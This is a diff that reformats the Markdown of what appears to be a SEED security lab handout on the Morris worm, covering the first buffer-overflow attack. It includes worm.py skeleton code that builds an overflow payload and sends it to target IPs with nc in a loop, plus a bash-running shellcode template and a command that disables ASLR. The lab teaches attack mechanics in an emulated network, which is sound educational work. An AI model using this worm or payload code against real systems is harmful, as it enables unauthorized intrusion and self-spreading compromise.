@@ -118,42 +118,25 @@ return). The machine running the `ping` command will flash. We will use this mec
 
 ## 4 Task 2: Attack the First Target
 
-In this task, we focus on the attacking part of the worm. The Morris worm exploited several vulnerabilities
-to gain entry to targeted systems, including a buffer-overflow vulnerability in the `fingerd `network service,
-a hole in the debug mode of the Unix `sendmail` program, and the transitive trust established by users for
-the remote shell [1, 2]. For the sake of simplicity, we will only exploit the buffer-overflow vulnerability.
-We have installed a vulnerable server on all the containers, and they all have a buffer-overflow vulnera-
-bility. The goal of this task is to exploit this vulnerability, so we can run our malicious code on the server.
-The attack part is the same as the Level-1 task in the Buffer-Overflow Lab, so if students have worked on
-that lab before, they can reuse the code from that lab here. We will not duplicate the instruction in this lab.
-Students can read the lab description of the Buffer-Overflow Lab (server version) to learn the setup of the
-server and the guidelines on the attack.
-First, we need to turn off the address randomization. This kernel parameter is global, so once we turn it
-off from the host machine, all the containers are affected.
+In this task, we focus on the attacking part of the worm. The Morris worm exploited several vulnerabilities to gain entry to targeted systems, including a buffer-overflow vulnerability in the `fingerd` network service, a hole in the debug mode of the Unix `sendmail` program, and the transitive trust established by users for the remote shell [1, 2]. For the sake of simplicity, we will only exploit the buffer-overflow vulnerability.
+<Br>
+&emsp;  We have installed a vulnerable server on all the containers, and they all have a buffer-overflow vulnerability. The goal of this task is to exploit this vulnerability, so we can run our malicious code on the server. The attack part is the same as the Level-1 task in the Buffer-Overflow Lab, so if students have worked on that lab before, they can reuse the code from that lab here. We will not duplicate the instruction in this lab.
+Students can read the lab description of the Buffer-Overflow Lab (server version) to learn the setup of the server and the guidelines on the attack.
+<Br>
+&emsp; First, we need to turn off the address randomization. This kernel parameter is global, so once we turn it off from the host machine, all the containers are affected.
 ```
-$ sudo /sbin/sysctl -w kernel.randomize_va_space=
+$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
 ```
-All the non-router containers in the emulator run the same vulnerable server. With the address random-
-ization disabled, all the servers will have the identical parameters, the addresses of the buffer and the value
-of the frame pointers will be the same across all the containers. This makes attack easier. The simplification
-is made because the focus of this lab is on the worm crawling part, instead of on the attack part. The attack
+&emsp; All the non-router containers in the emulator run the same vulnerable server. With the address randomization disabled, all the servers will have the identical parameters, the addresses of the buffer and the value of the frame pointers will be the same across all the containers. This makes attack easier. The simplification is made because the focus of this lab is on the worm crawling part, instead of on the attack part. The attack
 part is the main focus of the Buffer-Overflow Attack Lab.
-
 
 ### 4.1 The Skeleton Code
 
-We provide a skeleton code in the `Labsetup/worm` folder. We will complete this code gradually, one
-thing at a time in each task. In this task, we focus on completing the `createBadfile`()function, which
-is to generate the malicious payload for the buffer-overflow attack. We will launch this attack against our first
-target. We can choose any host as our first target. In the code, we have hard-coded the target `10.151.0`.
-(Line¿). Students should feel free to change it. In a later task, we will generate the target IP address, instead
-of hard-coding one.
-To help visualize the attack, we let the worm run a ping command in the background once it successfully
-gets into a victim host (see Line¡). This command sends out an ICMP echo message to a non-existing
-machine every 2 seconds. Our Map application will flash the node after seeing its ICMP messages. That is
-just one way to visualize the compromised hosts.
+We provide a skeleton code in the `Labsetup/worm` folder. We will complete this code gradually, one thing at a time in each task. In this task, we focus on completing the `createBadfile ()` function, which is to generate the malicious payload for the buffer-overflow attack. We will launch this attack against our first target. We can choose any host as our first target. In the code, we have hard-coded the target `10.151.0.71`. (Line ➀). Students should feel free to change it. In a later task, we will generate the target IP address, instead of hard-coding one.
+<Br>
+&emsp; To help visualize the attack, we let the worm run a ping command in the background once it successfully gets into a victim host (see Line ➁). This command sends out an ICMP echo message to a non-existing machine every 2 seconds. Our Map application will flash the node after seeing its ICMP messages. That is just one way to visualize the compromised hosts.
 
-Listing 1: The attack code: `worm.py`
+&emsp; &emsp; &emsp; &emsp; &emsp; &emsp; &emsp;  Listing 1: The attack code: `worm.py`
 ```
 shellcode= (
     ... code omitted (will be discussed later) ...
@@ -161,7 +144,7 @@ shellcode= (
 
 # Find the next victim (return an IP address)
 def getNextTarget():
-    return ’10.151.0.71’ ¿
+    return ’10.151.0.71’                                         ➀
 
 # Create the badfile (the malicious payload)
 def createBadfile():
@@ -171,7 +154,7 @@ def createBadfile():
 print("The worm has arrived on this host ˆ_ˆ", flush=True)
 
 # Run the ping program in the background
-subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True) ¡
+subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)            ➁
 
 # Create the badfile
 createBadfile()
@@ -179,13 +162,11 @@ createBadfile()
 while True:
     targetIP = getNextTarget()
 
-
     # Send the malicious payload (smaller payload) to the target host
     # This is done via exploiting the server’s vulnerability
     # It will block until the command exits
     subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"],
                         shell=True, stdin=None, close_fds=True)
-
 
     # Sleep for 1000 seconds before attacking another host
     # We will reduce this value later
@@ -194,8 +175,7 @@ while True:
 
 ### 4.2 Creating the badfile
 
-Let’s first send a benign message to our target server. We will see the following messages printed out by the
-target container (the actual messages you see may be different).
+Let’s first send a benign message to our target server. We will see the following messages printed out by the target container (the actual messages you see may be different).
 ```
 // On the host machine
 $ echo hello | nc -w2 10.151.0.71 9090
@@ -203,13 +183,11 @@ $ echo hello | nc -w2 10.151.0.71 9090
 // Messages printed out by the container
 as151h-host_0-10.151.0.71 | Starting stack
 as151h-host_0-10.151.0.71 | Input size: 6
-as151h-host_0-10.151.0.71 | Frame Pointer (ebp) inside bof(): 0xffffd5f8 P
-as151h-host_0-10.151.0.71 | Buffer’s address inside bof(): 0xffffd588 P
+as151h-host_0-10.151.0.71 | Frame Pointer (ebp) inside bof(): 0xffffd5f8     ✰
+as151h-host_0-10.151.0.71 | Buffer’s address inside bof(): 0xffffd588        ✰
 as151h-host_0-10.151.0.71 | ==== Returned Properly ====
 ```
-For the sake of simplicity, we let the server print out some of its internal parameters (see lines marked
-byP). Students are allowed to use these parameters when constructing their attacks. In particular, they need
-to modify Lines¿and¡inside `createBadfile`().
+&emsp; For the sake of simplicity, we let the server print out some of its internal parameters (see lines marked by ✰). Students are allowed to use these parameters when constructing their attacks. In particular, they need to modify Lines ➀ and ➁ inside `createBadfile ()`.
 ```
 def createBadfile():
     content = bytearray(0x90 for i in range(500))
@@ -217,8 +195,8 @@ def createBadfile():
     # Put the shellcode at the end
     content[500-len(shellcode):] = shellcode
 
-    ret     = 0x00 ¿
-    offset  = 0x00 ¡
+    ret     = 0x00         ➀
+    offset  = 0x00         ➁
 
 
     content[offset:offset + 4] = (ret).to_bytes(L,byteorder=’little’)
@@ -229,49 +207,34 @@ def createBadfile():
     with open(’badfile’, ’wb’) as f:
         f.write(content)
 ```
-To test the attack, simply run the attack program `worm.py`. It will generate the badfile, and then send
-its content to the target server. If you see a smiley face printed out on the target machine, that means that
-you are attack has succeeded, and your injected code has been executed.
+&emsp; To test the attack, simply run the attack program `worm.py`. It will generate the badfile, and then send its content to the target server. If you see a smiley face printed out on the target machine, that means that you are attack has succeeded, and your injected code has been executed.
 ```
 $ chmod +x worm.py
 $ ./worm.py
 ```
-**Lab task.** Please modify the provided skeleton code `worm.py`, launch the attack against the first target,
-and demonstrate that your attack is successful.
+**Lab task.** Please modify the provided skeleton code `worm.py`, launch the attack against the first target, and demonstrate that your attack is successful.
 
 ### 4.3 The Shellcode
 
-The malicious code that we would like to run on the target server is called shellcode, which is typically
-written using the assembly language and then converted to the binary machine code. In this lab, we only
-provide the binary version of a generic shellcode, without explaining how it works, because it is non-trivial.
-If students are interested in how exactly shellcode works and want to write a shellcode from scratch, they
-can learn that from a separate SEED lab called *Shellcode Lab.*
+The malicious code that we would like to run on the target server is called shellcode, which is typically written using the assembly language and then converted to the binary machine code. In this lab, we only provide the binary version of a generic shellcode, without explaining how it works, because it is non-trivial. If students are interested in how exactly shellcode works and want to write a shellcode from scratch, they can learn that from a separate SEED lab called *Shellcode Lab.*
 
-
-The provided shellcode (listed below) executes "`/bin/bash -c commands`", where `commands`
-are the commands put inside Lines¿,¡, and¬. Students can put whatever shell commands they want in
-these spaces (commands should be separated by semicolons or&&). We provide enough space (180 bytes)
-as students may need to run a long list of commands in the subsequent tasks.
-When putting commands in these three lines, make sure never change their length, or the shellcode may
-not work. Each line is exactly 60 characters long (see the ruler in Line√). When the shellcode runs, the *
-character at the end of Line¬will be replaced by a binary zero to mark the end of the command string. The
-offset of the * character is hardcoded in the binary code, so if the commands are longer than 180 bytes, they
-will be cut off.
+<Br>
+&emsp; The provided shellcode (listed below) executes "`/bin/bash -c commands`", where `commands` are the commands put inside Lines ➀, ➁, and ➂. Students can put whatever shell commands they want in these spaces (commands should be separated by semicolons or `&&`). We provide enough space (180 bytes) as students may need to run a long list of commands in the subsequent tasks.
+<Br>
+&emsp; When putting commands in these three lines, make sure never change their length, or the shellcode may not work. Each line is exactly 60 characters long (see the ruler in Line ➃). When the shellcode runs, the * character at the end of Line ➂ will be replaced by a binary zero to mark the end of the command string. The offset of the * character is hardcoded in the binary code, so if the commands are longer than 180 bytes, they will be cut off.
 ```
 shellcode= (
     ... the binary code is omitted ...
     "/bin/bash*"
     "-c*"
-    " echo ’(ˆ_ˆ) Shellcode is running (ˆ_ˆ)’; echo " ¿
-    " " ¡
-    " *" ¬
-    "123456789012345678901234567890123456789012345678901234567890" √
+    " echo ’(ˆ_ˆ) Shellcode is running (ˆ_ˆ)’; echo                 "  ➀
+    "                                                               "  ➁
+    "                                                              *"  ➂
+    "123456789012345678901234567890123456789012345678901234567890"     ➃
     # The line above serves as a ruler; it is not used by the shellcode.
 ).encode(’latin-1’)
 ```
-The assembly code for this shellcode is provided in the `Labsetup/shellcode` folder. Students who
-are interested in writing their own shellcode can modify the code there. Detailed instructions on how to
-write shellcode is given in a separate SEED lab, calledShellcode Development Lab.
+&emsp; The assembly code for this shellcode is provided in the `Labsetup/shellcode` folder. Students who are interested in writing their own shellcode can modify the code there. Detailed instructions on how to write shellcode is given in a separate SEED lab, called *Shellcode* Development Lab.
 
 ## 5 Task 3: Self Duplication
 
